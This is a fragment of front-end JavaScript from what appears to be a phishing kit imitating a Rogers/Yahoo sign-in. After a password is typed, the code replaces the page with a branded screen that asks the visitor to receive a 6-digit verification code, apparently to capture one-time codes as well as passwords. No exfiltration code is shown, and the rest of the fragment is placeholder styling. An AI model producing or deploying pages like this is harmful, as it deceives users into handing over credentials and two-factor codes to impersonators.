    ...
    setTimeout(() => {
      ...
      if (passwordInput.value && passwordInput.value.length > 3) {
        wrapper.innerHTML = `
          <header>
            <div class="logo">
              <img src="./asset/rogers-yahoo.png" alt="" />
            </div>
          </header>

          <main>
            <div class="mg-top-s">
              <h2 class="fw-700 fs-20">Recieived verification code</h2>
              <p class="mg-top-xs">To begin, select your preferred channel to receive a 6-digit verification code.</p>
              <button id="send-otp" class="btn mg-top-s"><span>Text: +1 *** *** ****</span></button>
            </div>
          </main> 
      `;
...
inputs.forEach((input) => {
  ...
  input.addEventListener("focus", function () {
    if (input.value === "" && document.activeElement === input) {
      customPlaceholder.classList.toggle("moveup");
    }
    return;
  });
